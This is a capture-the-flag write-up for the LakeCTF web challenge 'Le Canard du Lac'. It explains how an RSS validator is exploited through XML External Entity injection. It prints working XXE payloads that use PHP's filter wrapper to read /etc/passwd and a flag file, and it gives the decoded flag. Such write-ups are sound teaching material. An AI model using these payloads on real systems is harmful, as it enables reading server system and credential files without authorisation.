---
title: Le Canard du Lac
challenge_type: Web
writeup_author: "@xabito"
competition: lakectf-25-26-quals
summary: |-
  Le Canard du Lac is a news website run by a collective of hackers from Lake Leman (or Geneva). No brute-forcing is required.
connections:
  - url: https://chall.polygl0ts.ch:8085
---

## Recon

While exploring the website, we notice an RSS Validator tool that lets us submit XML files to be parsed on the server. This feature looks like it could be vulnerable to XML External Entity (XXE) injection attacks.

![XML Validator](/assets/files/lakectf-25-26-quals/le-canard-du-lac/validator.png)

## Exploitation

To test this, we can create an XXE payload that uses PHP's `filter` wrapper to read the contents of a file on the server:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<rss version="2.0">
    <channel>
        <title>&xxe;</title>
        <description>Testing XXE</description>
        <link>http://example.com</link>
    </channel>
</rss>
```

![XXE Check](/assets/files/lakectf-25-26-quals/le-canard-du-lac/check.png)

## Flag capture

We simply try typical file paths for the flag until we find the correct one and successfully extract the flag.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
]>
<rss version="2.0">
    <channel>
        <title>&xxe;</title>
        <description>Testing XXE</description>
        <link>http://example.com</link>
    </channel>
</rss>
```

![Flag capture](/assets/files/lakectf-25-26-quals/le-canard-du-lac/flag.png)

```bash
$ echo 'RVBGTHtsNGszX0xFTUFOX215c3RlcjFlc19AX2VwZmwhfQ==' | base64 -d
EPFL{l4k3_LEMAN_myster1es_@_epfl!}
```